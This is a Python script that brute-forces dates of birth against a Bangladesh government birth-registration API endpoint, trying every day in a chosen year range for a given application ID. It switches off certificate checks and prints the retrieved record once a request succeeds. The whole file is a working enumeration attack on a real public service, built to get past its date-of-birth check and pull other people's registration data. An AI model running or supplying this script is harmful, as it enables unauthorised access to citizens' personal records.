import requests
import urllib3
from datetime import datetime
import time

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ANSI codes
BOLD = "\033[1m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"

# User Input
try:
    app_id = input(f"{BOLD}📌 What is the App ID no: {RESET}")
    print(f"{BOLD}{YELLOW}🔑 App ID no: {app_id}{RESET}")

    start_year = int(input(f"{BOLD}🔢 Enter start year (YYYY): {RESET}"))
    end_year = int(input(f"{BOLD}🔢 Enter end year (YYYY): {RESET}"))

    if start_year > end_year:
        print(f"{BOLD}{RED}❌ Start year must be less than or equal to end year.{RESET}")
        exit()

except ValueError:
    print(f"{BOLD}{RED}❌ Invalid input. Please enter numbers for the year range.{RESET}")
    exit()

# Timer start
start_time = time.time()

# API endpoint
url = "https://bdris.gov.bd/api/br/application/print"

print(f"\n{BOLD}🔍 Starting brute-force search from {start_year} to {end_year}...{RESET}\n")

found = False
for year in range(start_year, end_year + 1):
    for month in range(1, 13):
        for day in range(1, 32):
            try:
                dob_obj = datetime(year, month, day)
                dob_str = dob_obj.strftime("%d/%m/%Y")

                params = {
                    "appId": app_id,
                    "date": dob_str
                }

                print(f"{BOLD}{GREEN}📅 Trying date: {dob_str}{RESET}", end=" ")
                response = requests.get(url, params=params, verify=False)
                status = response.status_code
                print(f"{BOLD}📡 Status Code: {status}{RESET}")

                if status == 200:
                    print(f"\n{BOLD}{GREEN}✅ Valid App ID and Date Found!{RESET}")
                    print(f"{BOLD}{GREEN}🗓️  Date of Birth: {dob_str}{RESET}")
                    print(f"{BOLD}{YELLOW}            App ID: {app_id}{RESET}")
                    print(f"{BOLD}📝 Response:\n{response.text}{RESET}")
                    found = True
                    break

            except ValueError:
                continue

        if found:
            break
    if found:
        break

# Timer end
end_time = time.time()
duration = round(end_time - start_time, 2)

if not found:
    print(f"\n{BOLD}{RED}⛔ No valid combination found in the given year range.{RESET}")

print(f"\n{BOLD}⏱️  Finished in {duration} seconds.{RESET}")
print(f"{BOLD}~ ${RESET}")
